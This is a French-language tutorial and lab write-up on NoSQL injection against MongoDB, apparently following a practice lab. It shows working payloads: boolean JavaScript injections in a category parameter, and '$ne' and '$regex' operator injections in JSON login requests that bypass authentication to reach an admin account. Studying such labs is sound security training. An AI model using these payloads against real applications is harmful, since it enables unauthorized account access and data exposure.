## Introduction
NoSQLi est une vulnérabilité qui permet à un pirate d'interférer avec les requêtes qu'une application adresse à une base de données NoSQL. L'injection NoSQL peut permettre à un attaquant de :

1.  Bypass authentication or protection mechanisms.
2.  Extract or edit data.
3.  Cause a denial of service.
4.  Execute code on the server.

Les bases de données NoSQL stockent et récupèrent les données dans un format différent des tables relationnelles SQL traditionnelles. Elles utilisent un large éventail de langages d'interrogation au lieu d'une norme universelle comme SQL, et ont moins de contraintes relationnelles.

## Types
Il existe deux types d'injection NoSQL :
- Syntax injection : Cela se produit lorsque vous pouvez casser la syntaxe des requêtes NoSQL, ce qui vous permet d'injecter votre propre charge utile. La méthodologie est similaire à celle utilisée pour l'injection SQL. Cependant, la nature de l'attaque varie considérablement, car les bases de données NoSQL utilisent un éventail de langages de requête, de types de syntaxe de requête et de structures de données différentes.
- Operation injection: Cela se produit lorsque vous pouvez utiliser les opérateurs de requête NoSQL pour manipuler les requêtes.

## Detection
### Syntax Injection
Dans un site qui a des categories, imagine qu'on tombe sur des categories
`https://insecure-website.com/product/lookup?category=Gifts`
Alors je change le `Gifts` par un quote `'` et je recois une erreur javascript

```
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
```

Verifions maintenant si reelement elle est vrai la vulnerabilte qui a ete detecte.
- J'ajoute la categorie `Gifts` suivi maintenat de `'+'`, et j'oublie pas le url encode.
- Dans la reponse l'erreur a disparu, ce qui veux dire qu'elle est vulnerable

### Determinez si on peux injecter des Bool pour modifier la reponse
- Pour commencer, j'insert une fausse condition
`/filter?category=Gifts' && 0 &&'x`
J'appercois qu'ici aucun produit n'est affiche
- Avec la condition Vraie
`/filter?category=Gifts' && 1 &&'x`
Ici toutes les produits de la page sont affichees
- maintenat je peux injecter une condition Js qui va toujours evaluer en `True`
`/filter?category=Gifts'||1||'x`
Comme la condition injectée est toujours vraie, la requête modifiée renvoie tous les articles. Cela vous permet d'afficher tous les produits de n'importe quelle catégorie, y compris les catégories cachées ou inconnues.

### Operator Injection
Les bases de données NoSQL utilisent souvent des opérateurs de requête, qui permettent de spécifier les conditions auxquelles les données doivent répondre pour être incluses dans le résultat de la requête. Voici quelques exemples d'opérateurs de requête MongoDB :

   - `$where` - Recherche les documents qui répondent à une expression JavaScript.
   - `$ne` - Recherche toutes les valeurs qui ne sont pas égales à une valeur spécifiée.
   - `$in` - Recherche toutes les valeurs spécifiées dans un tableau.
   - `$regex` - Sélectionne les documents dont les valeurs correspondent à une expression régulière spécifiée.

Vous pouvez injecter des opérateurs de requête pour manipuler les requêtes NoSQL. Pour ce faire, soumettez systématiquement différents opérateurs à une série d'entrées utilisateur, puis examinez les réponses à la recherche de messages d'erreur ou d'autres changements

#### Submitting Query operator
Dans les messages JSON, vous pouvez insérer des opérateurs de requête sous forme d'objets imbriqués. Par exemple, ``{"nom d'utilisateur" : "wiener"}`` devient ``{"nom d'utilisateur":{"$ne" : "invalid"}}``.

Pour les entrées basées sur une URL, vous pouvez insérer des opérateurs de requête via des paramètres URL. Par exemple, ``nom d'utilisateur=wiener `` devient ``nom d'utilisateur[$ne]=invalid``. Si cela ne fonctionne pas, vous pouvez essayer ce qui suit :

- Convertissez la méthode de requête de GET en POST.
- Changez l'en-tête Content-Type en application/json.
-  Ajoutez du JSON au corps du message.
-   Injecter des opérateurs de requête dans le JSON.

### Detection sur un login
J'ai le mot de passe d'un utilisateur, alors je vais checker en mettant juste le bon mot de passe et en replacant le nom

```json

{"username":{"$ne":""},"password":"peter"}

```
J'ai une redirection et qui marche, alors je vais utiliser le `$regex`

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}

```
j'ai une reponse
```
HTTP/2 302 Found
Location: /my-account?id=adminio1967l3
```
ca a trouver un utilisateur.
- Alors si j'envoi:

```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

ca me retourne : `Query returned unexpected number of records`. Ce qui veux simplement dire qu'il existe plusieurs utilisateur dans ce systemes.
- Alors comme il existe plusieurs utilisateur je vais juste utiliser le `$regex` pour trouver l'utilisateur que je veux

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}

```